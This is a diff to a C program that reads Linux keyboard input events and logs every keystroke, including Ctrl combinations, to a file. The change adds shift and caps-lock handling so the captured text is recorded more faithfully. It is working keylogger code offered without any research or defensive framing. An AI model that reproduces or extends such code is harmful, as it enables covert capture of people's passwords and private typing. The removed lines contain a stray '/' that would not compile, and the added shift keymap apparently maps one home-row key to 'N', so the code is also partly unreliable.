@@ -16,10 +16,20 @@ char keymap[58] = {
     'v', 'b', 'n', 'm', 0, 0, 0, 0, 0, 0, ' '
 };
 
+char shift_keymap[58] = {
+    0, 0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 0, 0, '\b', 0, 'Q',
+    'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', 0,
+    0, '\n', 0, 'A', 'S', 'D', 'F', 'G', 'H', 'J',
+    'K', 'L', 'N', 0, 0, 0, 0, 'Z', 'X', 'C',
+    'V', 'B', 'N', 'M', 0, 0, 0, 0, 0, 0, ' '
+};
+
 int ctrl_pressed = 0;
+int shift_pressed = 0;
+int caps_lock_on = 0;
 
 char *getEvent();
-char keycode_to_char(int keycode);
+char keycode_to_char(int keycode, int is_shifted);
 
 int main() {
     struct input_event ev;
@@ -52,21 +62,26 @@ int main() {
         if (ev.type == EV_KEY) {
             if (ev.value == 1) {
                 if (ev.code == 29 || ev.code == 97) {
-                    ctrl_pressed = 1; /
-                } else if (ctrl_pressed) {
-                    char ch = keycode_to_char(ev.code);
-                    if (ch != 0) {
-                        fprintf(fp, "Ctrl+%c\n", ch);
-                    }
+                    ctrl_pressed = 1;
+                } else if (ev.code == 42 || ev.code == 54) {
+                    shift_pressed = 1;
+                } else if (ev.code == 58) {
+                    caps_lock_on = !caps_lock_on;
                 } else {
-                    char ch = keycode_to_char(ev.code);
+                    char ch = keycode_to_char(ev.code, shift_pressed);
                     if (ch != 0) {
-                        fprintf(fp, "%c", ch);
+                        if (ctrl_pressed) {
+                            fprintf(fp, "Ctrl+%c\n", ch);
+                        } else {
+                            fprintf(fp, "%c", ch);
+                        }
                     }
                 }
             } else if (ev.value == 0) {
                 if (ev.code == 29 || ev.code == 97) {
                     ctrl_pressed = 0;
+                } else if (ev.code == 42 || ev.code == 54) {
+                    shift_pressed = 0;
                 }
             }
         }
@@ -91,9 +106,13 @@ char *getEvent() {
     return event;
 }
 
-char keycode_to_char(int keycode) {
+char keycode_to_char(int keycode, int is_shifted) {
     if (keycode >= 0 && keycode < sizeof(keymap)) {
-        return keymap[keycode];
+        char ch = is_shifted ? shift_keymap[keycode] : keymap[keycode];
+        if (caps_lock_on && ch >= 'a' && ch <= 'z') {
+            return ch - 'a' + 'A';
+        }
+        return ch;
     }
     return 0;
 }
